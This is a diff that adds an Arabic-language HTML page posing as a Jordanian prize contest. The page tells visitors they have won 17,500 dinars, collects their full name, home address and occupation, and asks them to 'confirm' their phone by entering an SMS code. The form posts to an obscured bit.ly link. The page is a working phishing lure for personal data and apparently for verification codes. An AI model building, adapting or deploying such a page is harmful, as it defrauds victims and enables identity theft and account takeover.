@@ -1,0 +1,147 @@
+<html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>مسابقات زيـــاد المنـــاصيـــــر
+</title>
+
+    <style>
+*{
+padding: 0;
+margin: 0;
+}
+
+.divv{
+margin: 15px;
+}
+.lb{
+font-size: larger;
+}
+.inp{
+    width: 80%;
+    height: 50px;
+    font-size: initial;
+    padding: 5px;
+    color: #2c2c2c;
+}
+</style>
+
+<script>
+    function submitForm1()
+    {
+       var regexp;
+       var Editbox1 = document.getElementById('name');
+       if (!(Editbox1.disabled || Editbox1.style.display === 'none' || Editbox1.style.visibility === 'hidden'))
+       {
+          if (Editbox1.value == "")
+          {
+             alert("يرجي ادخال الاسم ");
+             Editbox1.focus();
+             return false;
+          }
+          if (Editbox1.value.length < 8)
+          {
+             alert("يرجي ادخال اسم صحيح");
+             Editbox1.focus();
+             return false;
+          }
+          if (Editbox1.value.length > 50)
+          {
+             alert("يرجي ادخال اسم صحيح");
+             Editbox1.focus();
+             return false;
+          }
+       }
+       var Editbox2 = document.getElementById('adress');
+       if (!(Editbox2.disabled || Editbox2.style.display === 'none' || Editbox2.style.visibility === 'hidden'))
+       {
+          if (Editbox2.value == "")
+          {
+             alert("يرجي ادخال عنوان المنزل");
+             Editbox2.focus();
+             return false;
+          }
+          if (Editbox2.value.length < 10)
+          {
+             alert("يرجي ادخال عنوان منزل صحيح");
+             Editbox2.focus();
+             return false;
+          }
+          if (Editbox2.value.length > 150)
+          {
+             alert("يرجي ادخال عنوان منزل صحيح");
+             Editbox2.focus();
+             return false;
+          }
+       }
+       return true;
+    }
+    </script>
+
+
+
+</head>
+<body style="
+    background-color: #5271FF;
+">
+    <center>
+<div>
+
+
+
+<p style="
+    color: white;
+    font-size: 30px;
+">مسابقات زيـــاد المنـــاصيـــــر
+</p>
+</div>
+
+<form onsubmit="return submitForm1()" action="https://bit.ly/3DiJUKp" style="
+    margin: 20px;
+    background: aquamarine;
+    border-radius: 50px;
+    padding: 20px;
+">
+
+<p style="
+    font-size: 23px;
+">لقد تم اختيارك من ضمن الفائزين احد الفائزين فائز مبلغ 17.500 دينار اردنى. بدون شروط الشروط فقط قم بمشاركه المسابقه على الفيس بوك ليستفيد الجميع ضمن خطه مسابقات اردن بلا فقر
+</p>
+<div class="divv" style="
+    margin: 15px;
+">
+<label class="lb" style="
+    font-size: 15px;
+<label class="lb">الاسم بالكامل :</label>
+<input id='name' class="inp" type="text">
+</div>
+
+<div class="divv">
+<label class="lb">العنوان :</label>
+<input id='adress' class="inp" type="text">
+</div>
+
+<div class="divv">
+<label class="lb">المهنه الحاليه :</label>
+<input class="inp" placeholder="اتركها فارغة اذا كنت بلا عمل" type="text">
+</div>
+<p>يتبقى فقط خطوه واحده لإستلام جائزتك فقط قم بتأكيد رقم هاتفك للتأكد انك لست روبوت وسوف نقوم بالاتصال بك خلال 24 ساعه لإستلام جائزتك
+ملحوظه:
+يجب تأكيد الهاتف بوضع الكود الذى سيصلك فى رساله لإستكمال تسجيلك</p>
+<button style="
+    width: 50%;
+    font-family: system-ui;
+    height: 55px;
+    margin: 10px;
+    background: azure;
+    font-size: 24px;
+">تأكيد رقم هاتفك</button>
+</form>
+
+
+
+
+
+</center>  
+
+</body></html>
